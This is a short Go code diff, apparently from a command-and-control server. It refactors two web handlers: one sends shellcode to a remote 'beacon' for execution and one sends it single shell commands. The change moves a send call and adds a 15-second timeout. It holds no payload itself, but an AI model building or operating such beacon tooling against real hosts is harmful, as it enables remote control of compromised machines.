@@ -301,7 +301,7 @@ func (wh *webHandler) handleShellcode(w hRW, r *hR, p hP) {
 		Method:    r.FormValue("method"),
 		ShellCode: sc,
 	}
-	err = wh.ctx.sender.SendToBeacon(context.Background(),
+	err = wh.ctx.SendToBeacon(context.Background(),
 		&beaconGUID, messages.CMDBExecuteShellCode, &shellcode, true)
 	if err != nil {
 		fmt.Println("4", err)
@@ -332,8 +332,8 @@ func (wh *webHandler) handleSingleShell(w hRW, r *hR, p hP) {
 		Command: r.FormValue("cmd"),
 	}
 
-	reply, err := wh.ctx.SendToBeaconRT(context.Background(),
-		&beaconGUID, messages.CMDBSingleShell, &shell, true)
+	reply, err := wh.ctx.SendToBeaconRT(context.Background(), &beaconGUID,
+		messages.CMDBSingleShell, &shell, true, 15*time.Second)
 	if err != nil {
 		fmt.Println("2", err)
 		_, _ = w.Write([]byte(err.Error()))
